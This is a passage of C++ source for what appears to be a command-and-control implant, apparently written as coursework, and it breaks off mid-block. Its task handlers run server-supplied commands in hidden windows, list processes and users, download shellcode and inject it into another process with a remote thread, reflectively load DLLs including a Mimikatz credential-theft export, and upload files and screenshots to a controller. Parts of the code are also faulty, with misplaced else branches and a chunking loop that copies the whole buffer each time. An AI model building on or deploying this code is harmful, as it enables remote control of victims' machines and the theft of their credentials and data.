				taskresultcopy["status"] = 4;
				taskresultcopy["result"] = input.c_str();
			}
			else {
				COUT("[!] Failed to retrieve the current working directory. ");
				COUT("\n");
				taskresultcopy["status"] = 5;
				taskresultcopy["result"] = "";
			}

		}
		else if (type == 3) {
			const DWORD bufferLength = MAX_PATH;
			char buffer[bufferLength] = { 0 };

			DWORD result = GetCurrentDirectoryA(bufferLength, buffer);

			if (result > 0 && result < bufferLength) {
				COUT("[+] Current working directory:  ");
				COUT(buffer);
				COUT("\n");
				taskresultcopy["status"] = 4;
				taskresultcopy["result"] = buffer;
			}
			else {
				COUT("[!] Failed to retrieve the current working directory. ");
				COUT("\n");
				taskresultcopy["status"] = 5;
				taskresultcopy["result"] = "";
			}
		}
		else if (type == 5) {
			DWORD nameSize = 255;
			char username[256] = { 0 };

			if (GetUserNameA(username, &nameSize)) {
				COUT("[+] Username: ");
				COUT(username);
				COUT("\n");
				taskresultcopy["status"] = 4;
				taskresultcopy["result"] = username;
			}
			else {
				COUT("[!] Failed to retrieve the username");
				COUT("\n");
				taskresultcopy["status"] = 5;
				taskresultcopy["result"] = "";
			}
		}
		else if (type == 6)
		{
			std::vector<std::vector<std::string>> processTable;

			HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			if (hSnapshot == INVALID_HANDLE_VALUE) {
				COUT("[!] Failed to create process snapshot ");
				COUT("\n");
				taskresultcopy["status"] = 5;
				taskresultcopy["result"] = "";
			}
			else
			{
				PROCESSENTRY32W processEntry;
				processEntry.dwSize = sizeof(PROCESSENTRY32W);

				if (Process32FirstW(hSnapshot, &processEntry))
				{
					do {
						std::string pid = std::to_string(processEntry.th32ProcessID);
						std::string parentPid = std::to_string(processEntry.th32ParentProcessID);
						std::string arch = GetProcessArchitecture(processEntry.th32ProcessID);
						std::string user = GetProcessOwner(processEntry.th32ProcessID);
						std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
						std::string processName = converter.to_bytes(processEntry.szExeFile);

						std::vector<std::string> processRow;
						processRow.push_back(pid);
						processRow.push_back(parentPid);
						processRow.push_back(arch);
						processRow.push_back(user);
						processRow.push_back(processName);

						processTable.push_back(processRow);

						std::cout << std::left << std::setw(10) << "PID"
							<< std::setw(10) << "Parent"
							<< std::setw(10) << "Arch"
							<< std::setw(20) << "User"
							<< "Process Name" << std::endl;

						std::cout << std::setw(10) << pid
							<< std::setw(10) << parentPid
							<< std::setw(10) << arch
							<< std::setw(20) << user
							<< processName << std::endl;
						std::cout << std::endl;
					} while (Process32NextW(hSnapshot, &processEntry));

					taskresultcopy["status"] = 4;
					json jsonProcessTable = processTable;
					taskresultcopy["result"] = jsonProcessTable.dump();
				}
				else
				{
					COUT(" ");
					COUT("\n");
					taskresultcopy["status"] = 5;
					taskresultcopy["result"] = "";
				}

				CloseHandle(hSnapshot);
			}
		}
		else if (type == 11)
		{
			CHAR szBuffer[1024];
			char *data = nullptr;
			DWORD dataSize = 0;
			std::string fileId = res["file_id"];
			std::string taskId = res["id"];
			COUT ("[+] Started Shellcode Download");
			COUT("\n");
			if (http_request_downloadFile("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, &data, &dataSize, fileId, szBuffer, taskId))
			{
				LPVOID pRemoteCode = NULL;
				HANDLE hThread = NULL;
				int iRet = -1;
				DWORD dummy = 0;
				std::string valueStr = res["input"];
				DWORD pid = std::stoul(valueStr);
				COUT("[+] GOT PID");
				COUT(pid);
				COUT("\n");
			

				HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
				if (hProc == NULL) {
					COUT("[!] Failed to open the process.");
					COUT("\n");
					taskresultcopy["status"] = 5;
					taskresultcopy["result"] = "";
				}
				else
				{
					SIZE_T payload_len = dataSize;
					PVOID payload = malloc(dataSize);
					std::memcpy(payload, data, dataSize);
					pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
					if (pRemoteCode == NULL)
						goto Cleanup;

					if (!WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL))
						goto Cleanup;

					if (!VirtualProtectEx(hProc, pRemoteCode, (SIZE_T)payload_len, PAGE_EXECUTE_READ, &dummy))
						goto Cleanup;

					// Call CreateRemoteThread in the target process
					hThread = CreateRemoteThread(
						hProc,
						NULL,
						0,
						(LPTHREAD_START_ROUTINE)pRemoteCode,
						NULL,
						0,
						NULL
					);

					if (hThread != NULL)
					{
						WaitForSingleObject(hThread, 500);
						iRet = 0;
						COUT("[+] Remote Code execution successful");
						COUT("\n");
						taskresultcopy["status"] = 4;
						taskresultcopy["result"] = "";
					}

				Cleanup:

					if (pRemoteCode)
					{
						SecureZeroMemory(payload, payload_len);
						VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
					}
					if (hThread)
					{
						SecureZeroMemory(&hThread, sizeof(hThread));
						CloseHandle(hThread);
					}
				}
				if (iRet == -1)
				{
					COUT("[!] Remote Code Execution Failed");
					COUT("\n");
					taskresultcopy["status"] = 5;
					taskresultcopy["result"] = "";
				}
				if (hProc != NULL)
				{
					CloseHandle(hProc);
				}
			}
			else
			{
				COUT("[!] Request failed! Couldn't download shell code");
				COUT("\n");
				taskresultcopy["status"] = 5;
				taskresultcopy["result"] = "";
			}
		}
		else if (type == 7)
		{
			// These needs to be changed.
			std::string fileId = res["file_id"];
			std::string taskId = res["id"];
			std::string input = res["input"];
			std::string agentId = res["agent_id"];
			CHAR szBuffer[1024];
			int status;
			char* data = nullptr;
			DWORD dataSize = 0;
			int flag = 0;
			COUT("[+] Upload Started");
			COUT("\n");
			

			if (http_request_downloadFile("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, &data, &dataSize, fileId, szBuffer, taskId))
			{
				HANDLE fileHandle = CreateFileA(input.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				if (fileHandle == INVALID_HANDLE_VALUE) {
					COUT("[!] Request Failed ! Couldn't download file");
					COUT("\n");
					flag = 1;
				}

				DWORD bytesWritten;
				if (!WriteFile(fileHandle, data, dataSize, &bytesWritten, NULL)) {
					COUT("[!] Request Failed ! Couldn't download file");
					COUT("\n");
					flag = 1;
				}
				if (flag == 1) {
					taskresultcopy["status"] = 5;
					status = 5;
					taskresultcopy["result"] = "";
				}
				else {
					taskresultcopy["status"] = 4;
					status = 4;
					taskresultcopy["result"] = "";
					COUT("[+] File saved successfuly");
					COUT(input);
					COUT("\n");
				}
				CloseHandle(fileHandle);
			}
			else 
			{
				COUT("[!] Request Failed ! Couldn't download file");
				COUT("\n");
				taskresultcopy["status"] = 5;
				taskresultcopy["result"] = "";
				
			}
		}

		else if (type == 2)
		{
			BOOL ok = TRUE;
			HANDLE hStdInPipeRead = NULL;
			HANDLE hStdInPipeWrite = NULL;
			HANDLE hStdOutPipeRead = NULL;
			HANDLE hStdOutPipeWrite = NULL;
			int flag = 0;
			// Create two pipes.
			SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
			ok = CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &sa, 0);
			if (ok == FALSE) flag = 1;
			ok = CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0);
			if (ok == FALSE) flag = 1;

			// Create the process.
			STARTUPINFOW si = { 0 };
			si.cb = sizeof(STARTUPINFO);
			//si.dwFlags = STARTF_USESTDHANDLES;
			si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
			si.wShowWindow = SW_HIDE;
			si.hStdError = hStdOutPipeWrite;
			si.hStdOutput = hStdOutPipeWrite;
			si.hStdInput = hStdInPipeRead;
			PROCESS_INFORMATION pi = { 0 };

			// change the lpApplicationName to NULL
			//LPCWSTR lpApplicationName = L"C:\\Windows\\System32\\cmd.exe";
			LPCWSTR lpApplicationName = NULL;

			//
			// https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
			//
			
			std::string input = res["input"];
			std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
			std::wstring lpCommandLine = converter.from_bytes(input);
			//std::wstring lpCommandLine = L"cmd.exe /c dir";
			std::wcout<< lpCommandLine << std::endl;
			LPSECURITY_ATTRIBUTES lpProcessAttributes = NULL;
			LPSECURITY_ATTRIBUTES lpThreadAttribute = NULL;
			BOOL bInheritHandles = TRUE;
			DWORD dwCreationFlags = 0;
			LPVOID lpEnvironment = NULL;
			LPCWSTR lpCurrentDirectory = NULL;

			
			ok = CreateProcessW(
				lpApplicationName,
				(LPWSTR)lpCommandLine.c_str(),
				lpProcessAttributes,
				lpThreadAttribute,
				bInheritHandles,
				dwCreationFlags,
				lpEnvironment,
				lpCurrentDirectory,
				&si,
				&pi);
			if (!ok) flag = 1;

			if (WaitForSingleObject(pi.hProcess, 10000) == WAIT_TIMEOUT)
			{
				TerminateProcess(pi.hProcess, 0);
				CloseHandle(pi.hProcess);
				CloseHandle(pi.hThread);
				CloseHandle(hStdOutPipeWrite);
				CloseHandle(hStdInPipeRead);
				flag = 1;
			}

			// Close pipes we do not need.
			CloseHandle(hStdOutPipeWrite);
			CloseHandle(hStdInPipeRead);

			char buf[1024 + 1] = { 0 };
			std::string cmdOut;
			DWORD dwRead = 0;
			//DWORD dwAvail = 0;
			ok = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);
			while (ok)
			{
				buf[dwRead] = '\0';
				std::cout << buf;
				cmdOut.append(buf);
				ok = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);
			}

			// Clean up and exit.
			CloseHandle(hStdOutPipeRead);
			CloseHandle(hStdInPipeWrite);
			DWORD dwExitCode = 0;
			GetExitCodeProcess(pi.hProcess, &dwExitCode);

			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			SecureZeroMemory(buf, sizeof(buf));
			if (dwExitCode != 0 || flag == 1)
			{
				taskresultcopy["status"] = 5;
				taskresultcopy["result"] = "";
			}
			else {
				taskresultcopy["status"] = 4;
				taskresultcopy["result"] = cmdOut;
			}
		}

		// HW7
		else if (type == 8) 
		{
			std::string taskId = res["id"];
			std::string input = res["input"];
			std::string agentId = res["agent_id"];
			CHAR szBuffer[1024];
			int flag = 0;
			const char* filename = input.c_str();
			COUT("[+] Opening File");
			COUT("\n");
			
			// Open the file
			HANDLE fileHandle = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (fileHandle == INVALID_HANDLE_VALUE) {
				COUT("[!] Failed to open file");
				COUT("\n");
				flag = 1;
			}

			// Get the file size
			LARGE_INTEGER fileSize;
			if (!GetFileSizeEx(fileHandle, &fileSize)) {
				COUT("[!] Failed to get size");
				COUT("\n");
				CloseHandle(fileHandle);
				flag = 1;
			}

			// Calculate the number of chunks needed
			DWORD numChunks = static_cast<DWORD>((fileSize.QuadPart + CHUNK_SIZE - 1) / CHUNK_SIZE);

			// Create an array to store the file chunks
			char** chunks = new char*[numChunks];
			size_t lastchunk = 0;
			std::ifstream file(filename, std::ios::binary);
			DWORD i = 0;
			while (file.good() && i < numChunks) {
				size_t chunkSize = std::min<size_t>(CHUNK_SIZE, fileSize.QuadPart - i * CHUNK_SIZE);
				chunks[i] = new char[chunkSize];
				file.read(chunks[i], chunkSize);
				std::streamsize bytesRead = file.gcount();
				++i;
				if (i == numChunks) {
					lastchunk = chunkSize;
				}
			}
			file.close();


			// Close the file handle
			CloseHandle(fileHandle);
			
			if (http_request_upload("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, chunks, taskId, input, numChunks, szBuffer, lastchunk))
			{
				COUT("[+] File upload successful");
				COUT("\n");
				int status = 4;
				CHAR szBuffer[1024];
				const std::string result = "";
				if (http_request_uploadEnd("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, taskId, agentId, result, status, szBuffer)) {
					taskresultcopy["status"] = 4;
					taskresultcopy["result"] = result;
				}
				else {
					COUT("[!] File Upload Fail");
					COUT("\n");
	
					flag = 1;
				}
			}
			else {
				COUT("[!] File Upload Fail");
				COUT("\n");
				flag = 1;
			}

			if (flag == 1) {
				taskresultcopy["status"] = 5;
				taskresultcopy["result"] = "";
			}

			// Clean up memory
			for (DWORD i = 0; i < numChunks; ++i) {
				delete[] chunks[i];
			}
			delete[] chunks;

		}

		//Hw8
		else if (type == 9) {
		std::string fileId = res["file_id"];
		std::string taskId = res["id"];
		CHAR szBuffer[1024];
		int status;
		char* data = nullptr;
		DWORD dataSize = 0;
		int flag = 0;
		COUT("[+] Upload Started");
		COUT("\n");

		if (http_request_downloadFile("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, &data, &dataSize, fileId, szBuffer, taskId))
		{
				HMODULE hDLL = NULL;
				TCHAR buffer[MAX_PATH] = {0};
//				DWORD result = GetCurrentDirectoryA(MAX_PATH, buffer);
				COUT(buffer);
				if (!loadDll(&data, &hDLL))
				{
					COUT("failed to load DLL\n");
					return -1;
				}
				
				std::string func = "ExecuteW";
				std::wstring input = L"";
				std::wstring out = L"";
				void* fn = GetProcAddressR(hDLL, func.c_str());
				if (fn != nullptr)
				{
					FUNCTIONW exportedProcedure = (FUNCTIONW)fn;

					if (exportedProcedure)
					{
						COUT("[+] Calling exported functon - ExecuteW\n");
						wprintf(L"[+] Input: %s\n", input.c_str());
						std::wstring output = L"";

						try
						{
							LPWSTR lpsz = exportedProcedure(input.c_str(), (DWORD)input.size());
							if (lpsz)
							{
								output = lpsz;
								SecureZeroMemory(lpsz, sizeof(lpsz));
								HeapFree(GetProcessHeap(), 0, lpsz);

								lpsz = NULL;
								COUT("Output:\n");
								WCOUT(output);
								COUT("\n");
								out = output;
								taskresultcopy["status"] = 4;
								status = 4;
								taskresultcopy["result"] = "";
							}
							else {
								flag = 1;
							}
						}
						catch (const std::exception& ex) {
							COUT("[+] Exception caught : ");
							COUT(ex.what());
							COUT("\n");
						}
					}
					else {
						flag = 1;
					}
				}
				else {
					flag = 1;
				}

				if (hDLL)
				{
					SecureZeroMemory(hDLL, sizeof(hDLL));
					FreeLibrary(hDLL);
					hDLL = NULL;
				}

			else {
				flag = 1;
			}

			if (flag == 1) {
				COUT("[!] Request Failed ! Couldn't set permissions");
				COUT("\n");
				taskresultcopy["status"] = 5;
				taskresultcopy["result"] = "";
			}
		}
		else
		{
			COUT("[!] Request Failed ! Couldn't download file");
			COUT("\n");
			taskresultcopy["status"] = 5;
			taskresultcopy["result"] = "";

		}
		
}

		else if (type == 10) {
		std::string fileId = res["file_id"];
		std::string taskId = res["id"];
		
		CHAR szBuffer[1024];
		int status;
		char* data = nullptr;
		DWORD dataSize = 0;
		int flag = 0;
		COUT("[+] Upload Started");
		COUT("\n");

		if (http_request_downloadFile("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, &data, &dataSize, fileId, szBuffer, taskId))
		{
				HMODULE hDLL = NULL;
				TCHAR buffer[MAX_PATH] = { 0 };
			//	DWORD result = GetCurrentDirectoryA(MAX_PATH, buffer);
				COUT(buffer);
				if (!loadDll(&data, &hDLL))
				{
					COUT("failed to load DLL\n");
					flag = 1;
				}

				std::string func = "ExecuteW";
				std::string inputString = res["input"].get<std::string>();
				std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
				std::wstring input = converter.from_bytes(inputString);
				//std::wstring input = L"SeChangeNotifyPrivilege disabled";
				void* fn = GetProcAddressR(hDLL, func.c_str());
				if (fn != nullptr)
				{
					FUNCTIONW exportedProcedure = (FUNCTIONW)fn;

					if (exportedProcedure)
					{
						COUT("[+] Calling exported functon - ExecuteW\n");
						wprintf(L"[+] Input: %s\n", input.c_str());
						std::wstring out = L"";

						try
						{
							LPWSTR lpsz = exportedProcedure(input.c_str(), (DWORD)input.size());
							//WCOUT(lpsz);
							if (lpsz)
							{
								out = lpsz;
								SecureZeroMemory(lpsz, sizeof(lpsz));
								HeapFree(GetProcessHeap(), 0, lpsz);

								lpsz = NULL;
								if (out.size() > 0)
								{
									DWORD dwOutLen = (DWORD)out.length();
									DWORD dwResultLen = dwOutLen + 1;
									LPWSTR result = NULL;
									result = (LPWSTR)LocalAlloc(LPTR, dwResultLen * sizeof(WCHAR));
									if (result == NULL)
									{
									 flag = 1;
									}
									HRESULT hr = StringCchCopyNW(result, dwResultLen, (LPWSTR)out.c_str(), dwOutLen);
									if (SUCCEEDED(hr))
									{
										wprintf(L"%s\n", result);
										COUT("[+] Permissions set Successfully");
										taskresultcopy["status"] = 4;
										status = 4;
										taskresultcopy["result"] = "";
									}
									else {
										flag = 1;
									}

									LocalFree(result);
								}
								else {
									flag = 1;
								}
					
							}
							else {
								flag = 1;
							}
						}
						catch (const std::exception& ex) {
							COUT("[+] Exception caught : ");
							COUT(ex.what());
							COUT("\n");
						}
					}
					else {
						flag = 1;
					}
				}
				else {
					flag = 1;
				}

				if (hDLL)
				{
					SecureZeroMemory(hDLL, sizeof(hDLL));
					FreeLibrary(hDLL);
					hDLL = NULL;
				}
			else {
				flag = 1;
			}

			if (flag == 1) {
				COUT("[!] Request Failed ! Couldn't set permissions");
				COUT("\n");
				taskresultcopy["status"] = 5;
				taskresultcopy["result"] = "";
			}

		}
		else
		{
			COUT("[!] Request Failed ! Couldn't download file");
			COUT("\n");
			taskresultcopy["status"] = 5;
			taskresultcopy["result"] = "";

		}


	}

	else if (type == 12) {
	std::string fileId = res["file_id"];
	std::string taskId = res["id"];
	CHAR szBuffer[1024];
	int status;
	char* data = nullptr;
	DWORD dataSize = 0;
	int flag = 0;
	COUT("[+] Upload Started");
	COUT("\n");

	if (http_request_downloadFile("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, &data, &dataSize, fileId, szBuffer, taskId))
	{
		HMODULE hDLL = NULL;
		TCHAR buffer[MAX_PATH] = { 0 };
//		DWORD result = GetCurrentDirectoryA(MAX_PATH, buffer);
		COUT(buffer);
		if (!loadDll(&data, &hDLL))
		{
			COUT("failed to load DLL\n");
			flag = 1;
		}

		std::string func = "ExecuteW";
		std::string inputString = res["input"].get<std::string>();
		std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
		std::wstring input = converter.from_bytes(inputString);
		//std::wstring input = L"SeChangeNotifyPrivilege disabled";
		void* fn = GetProcAddressR(hDLL, func.c_str());
		if (fn != nullptr)
		{
			FUNCTIONW exportedProcedure = (FUNCTIONW)fn;

			if (exportedProcedure)
			{
				COUT("[+] Calling exported functon - ExecuteW\n");
				wprintf(L"[+] Input: %s\n", input.c_str());
				std::wstring out = L"";

				try
				{
					LPWSTR lpsz = exportedProcedure(input.c_str(), (DWORD)input.size());
					//WCOUT(lpsz);
					if (lpsz)
					{
						out = lpsz;
						SecureZeroMemory(lpsz, sizeof(lpsz));
						HeapFree(GetProcessHeap(), 0, lpsz);

						lpsz = NULL;
						if (out.size() > 0)
						{
							DWORD dwOutLen = (DWORD)out.length();
							DWORD dwResultLen = dwOutLen + 1;
							LPWSTR result = NULL;
							result = (LPWSTR)LocalAlloc(LPTR, dwResultLen * sizeof(WCHAR));
							if (result == NULL)
							{
								flag = 1;
							}
							HRESULT hr = StringCchCopyNW(result, dwResultLen, (LPWSTR)out.c_str(), dwOutLen);
							if (SUCCEEDED(hr))
							{
								wprintf(L"%s\n", result);
								COUT("[+] Method working successfully");
								taskresultcopy["status"] = 4;
								status = 4;
								taskresultcopy["result"] = "";
							}
							else {
								flag = 1;
							}

							LocalFree(result);
						}
						else {
							flag = 1;
						}

					}
					else {
						flag = 1;
					}
				}
				catch (const std::exception& ex) {
					COUT("[+] Exception caught : ");
					COUT(ex.what());
					COUT("\n");
				}
			}
			else {
				flag = 1;
			}
		}
		else {
			flag = 1;
		}

		if (hDLL)
		{
			SecureZeroMemory(hDLL, sizeof(hDLL));
			FreeLibrary(hDLL);
			hDLL = NULL;
		}
		else {
			flag = 1;
		}

		if (flag == 1) {
			COUT("[!] Request Failed ! Invalid method");
			COUT("\n");
			taskresultcopy["status"] = 5;
			taskresultcopy["result"] = "";
		}

	}
	else
	{
		COUT("[!] Request Failed ! Couldn't download file");
		COUT("\n");
		taskresultcopy["status"] = 5;
		taskresultcopy["result"] = "";

	}


	}

	
		else if (type == 13) {
		std::string fileId = res["file_id"];
		std::string taskId = res["id"];
		CHAR szBuffer[1024];
		int status;
		char* data = nullptr;
		DWORD dataSize = 0;
		int flag = 0;
		COUT("[+] Upload Started");
		COUT("\n");

		if (http_request_downloadFile("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, &data, &dataSize, fileId, szBuffer, taskId))
		{
			HMODULE hDLL = NULL;
			TCHAR buffer[MAX_PATH] = { 0 };
//			DWORD result = GetCurrentDirectoryA(MAX_PATH, buffer);
			COUT(buffer);
			if (!loadDll(&data, &hDLL))
			{
				COUT("failed to load DLL\n");
				flag = 1;
			}

			std::string func = "ExecuteW";
			std::string inputString = res["input"].get<std::string>();
			std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
			std::wstring input = converter.from_bytes(inputString);
			//std::wstring input = L"SeChangeNotifyPrivilege disabled";
			void* fn = GetProcAddressR(hDLL, func.c_str());
			if (fn != nullptr)
			{
				FUNCTIONW exportedProcedure = (FUNCTIONW)fn;

				if (exportedProcedure)
				{
					COUT("[+] Calling exported functon - ExecuteW\n");
					wprintf(L"[+] Input: %s\n", input.c_str());
					std::wstring out = L"";

					try
					{
						LPWSTR lpsz = exportedProcedure((LPWSTR)input.c_str(), (DWORD)input.size());
						//WCOUT(lpsz);
						if (lpsz)
						{
							out = lpsz;
							SecureZeroMemory(lpsz, sizeof(lpsz));
							HeapFree(GetProcessHeap(), 0, lpsz);

							lpsz = NULL;
							if (out.size() > 0)
							{
								DWORD dwOutLen = (DWORD)out.length();
								DWORD dwResultLen = dwOutLen + 1;
								LPWSTR result = NULL;
								result = (LPWSTR)LocalAlloc(LPTR, dwResultLen * sizeof(WCHAR));
								if (result == NULL)
								{
									flag = 1;
								}
								HRESULT hr = StringCchCopyNW(result, dwResultLen, (LPWSTR)out.c_str(), dwOutLen);
								if (SUCCEEDED(hr))
								{
									wprintf(L"%s\n", result);
									COUT("[+] Method working successfully");
									taskresultcopy["status"] = 4;
									status = 4;
									taskresultcopy["result"] = "";
								}
								else {
									flag = 1;
								}

								LocalFree(result);
							}
							else {
								flag = 1;
							}

						}
						else {
							flag = 1;
						}
					}
					catch (const std::exception& ex) {
						COUT("[+] Exception caught : ");
						COUT(ex.what());
						COUT("\n");
					}
				}
				else {
					flag = 1;
				}
			}
			else {
				flag = 1;
			}

			if (hDLL)
			{
				SecureZeroMemory(hDLL, sizeof(hDLL));
				FreeLibrary(hDLL);
				hDLL = NULL;
			}
			else {
				flag = 1;
			}

			if (flag == 1) {
				COUT("[!] Request Failed ! Invalid method");
				COUT("\n");
				taskresultcopy["status"] = 5;
				taskresultcopy["result"] = "";
			}

		}
		else
		{
			COUT("[!] Request Failed ! Couldn't download file");
			COUT("\n");
			taskresultcopy["status"] = 5;
			taskresultcopy["result"] = "";

		}


		}
		else if (type == 16) {
		std::string fileId = res["file_id"];
		std::string taskId = res["id"];
		CHAR szBuffer[1024];
		int status;
		char* data = nullptr;
		DWORD dataSize = 0;
		int flag = 0;
		COUT("[+] Upload Started");
		COUT("\n");

		if (http_request_downloadFile("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, &data, &dataSize, fileId, szBuffer, taskId))
		{
			HMODULE hDLL = NULL;
			TCHAR buffer[MAX_PATH] = { 0 };
			//			DWORD result = GetCurrentDirectoryA(MAX_PATH, buffer);
			COUT(buffer);
			if (!loadDll(&data, &hDLL))
			{
				COUT("failed to load DLL\n");
				flag = 1;
			}

			std::string func = "powershell_reflective_mimikatz";
			std::string inputString = res["input"].get<std::string>();
			std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
			std::wstring input = converter.from_bytes(inputString);
			//std::wstring input = L"SeChangeNotifyPrivilege disabled";
			void* fn = GetProcAddressR(hDLL, func.c_str());
			if (fn != nullptr)
			{
				FUNCTIONWMimi exportedProcedure = (FUNCTIONWMimi)fn;

				if (exportedProcedure)
				{
					COUT("[+] Calling exported functon\n");
					wprintf(L"[+] Input: %s\n", input.c_str());
					std::wstring out = L"";
					std::wstring output = L"";
					try
					{
						LPWSTR lp = exportedProcedure((LPWSTR)input.c_str());
						//WCOUT(lpsz);
						if (lp)
						{	
							output = lp;
							SecureZeroMemory(lp, sizeof(lp));
							HeapFree(GetProcessHeap(), 0, lp);

							lp = NULL;
							PRINTF("Output:\n");
							COUT(std::endl);
							WCOUT(output);
							COUT("[!] Request Successful");
							COUT("\n");
							taskresultcopy["status"] = 4;

							std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
							std::string str = converter.to_bytes(output);

							std::string res;
							Base64Encode(str, &res);
							taskresultcopy["result"] = res;
						}
						else {
							flag = 1;
						}
					}
					catch (const std::exception& ex) {
						COUT("[+] Exception caught : ");
						COUT(ex.what());
						COUT("\n");
					}
				}
				else {
					flag = 1;
				}
			}
			else {
				flag = 1;
			}

			if (hDLL)
			{
				SecureZeroMemory(hDLL, sizeof(hDLL));
				FreeLibrary(hDLL);
				hDLL = NULL;
			}
			else {
				flag = 1;
			}

			if (flag == 1) {
				COUT("[!] Request Failed ! Invalid method");
				COUT("\n");
				taskresultcopy["status"] = 5;
				taskresultcopy["result"] = "";
			}

		}
		else
		{
			COUT("[!] Request Failed ! Couldn't download file");
			COUT("\n");
			taskresultcopy["status"] = 5;
			taskresultcopy["result"] = "";

		}


		}
		else if (type == 14) 
		{
			std::string fileId = res["file_id"];
			std::string taskId = res["id"];
			CHAR szBuffer[1024];
//			int status;
			char* data = nullptr;
			DWORD dataSize = 0;
			int flag = 0;
			COUT("[+] Upload Started");
			COUT("\n");

			if (http_request_downloadFile("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, &data, &dataSize, fileId, szBuffer, taskId))
			{
				HMODULE hDLL = NULL;
				TCHAR buffer[MAX_PATH] = { 0 };
//				DWORD result = GetCurrentDirectoryA(MAX_PATH, buffer);
				COUT(buffer);
				if (!loadDll(&data, &hDLL))
				{
					COUT("failed to load DLL\n");
					return -1;
				}

				std::string func = "ExecuteW";
				std::wstring input = L"";
				void* fn = GetProcAddressR(hDLL, func.c_str());
				if (fn != nullptr)
				{
					ExecuteWFunc exportedProcedure = (ExecuteWFunc)fn;
					DWORD length = 0;
					if (exportedProcedure)
						{
						COUT("[+] Calling exported functon - ExecuteW\n");
				
						try
						{
							LPBYTE lpsz = exportedProcedure((LPWSTR)input.c_str(), &length);
							if (lpsz)
							{	
								
								std::string dataFormat = "png";
								COUT(length);
								std::vector<BYTE> dataVector;
								dataVector.assign(lpsz, lpsz + length);
								//std::ofstream fout("Screenshot." + dataFormat, std::ios::binary);
								//fout.write((char*)dataVector.data(), dataVector.size());
								SecureZeroMemory(lpsz, sizeof(lpsz));
								HeapFree(GetProcessHeap(), 0, lpsz);
								lpsz = NULL;


								//////////////////////////////////////////////////////////////////////////////////////////
								
								std::string taskId = res["id"];
								std::string input = "screenshot";
								std::string agentId = res["agent_id"];
								CHAR szBuffer[1024];
								int flag = 0;
								COUT("[+] Opening File");
								COUT("\n");
								
								size_t fileSize = dataVector.size();
							
								DWORD numChunks = static_cast<DWORD>((fileSize + CHUNK_SIZE - 1) / CHUNK_SIZE);

								
								char** chunks = new char*[numChunks];

								size_t lastchunk = 0;
								for (size_t i = 0; i < numChunks; ++i) {
									size_t offset = i * CHUNK_SIZE;
									size_t size = std::min<size_t>(CHUNK_SIZE, dataVector.size() - offset);
									if (size != CHUNK_SIZE) {
										lastchunk = dataVector.size() - offset;
										COUT(lastchunk);
									}
									chunks[i] = new char[size];  
									std::copy(dataVector.begin(), dataVector.end(), chunks[i]);
								}
								//std::ofstream fout("Screenshooot." + dataFormat, std::ios::binary);
								//fout.write(chunks[0], dataVector.size());
								//fout.close();
								if (http_request_upload("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, chunks, taskId, input, numChunks, szBuffer, lastchunk))
								{
									COUT("[+] File upload successful");
									COUT("\n");
									int status = 4;
									CHAR szBuffer[1024];
									const std::string result = "";
									if (http_request_uploadEnd("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, taskId, agentId, result, status, szBuffer)) {
										taskresultcopy["status"] = 4;
										taskresultcopy["result"] = result;
									}
									else {
										COUT("[!] File Upload Fail");
										COUT("\n");

										flag = 1;
									}
								}
								else {
									COUT("[!] File Upload Fail");
									COUT("\n");
									flag = 1;
								}

								if (flag == 1) {
									taskresultcopy["status"] = 5;
									taskresultcopy["result"] = "";
								}

								// Clean up memory
								for (DWORD i = 0; i < numChunks; ++i) {
									delete[] chunks[i];
								}
								delete[] chunks;

								////////////////////////////////////////////////////////////////////////////////////////////////

							}
							else {
								flag = 1;
							}
						}
						catch (const std::exception& ex) {
							COUT("[+] Exception caught : ");
							COUT(ex.what());
							COUT("\n");
						}
					}
					else {
						flag = 1;
					}
				}
				else {
					flag = 1;
				}

				if (hDLL)
				{
					SecureZeroMemory(hDLL, sizeof(hDLL));
					FreeLibrary(hDLL);
					hDLL = NULL;
				}

				else {
					flag = 1;
				}

				if (flag == 1) {
					COUT("[!] Request Failed ! Couldn't take screenshot");
					COUT("\n");
					taskresultcopy["status"] = 5;
					taskresultcopy["result"] = "";
				}
			}
			else
			{
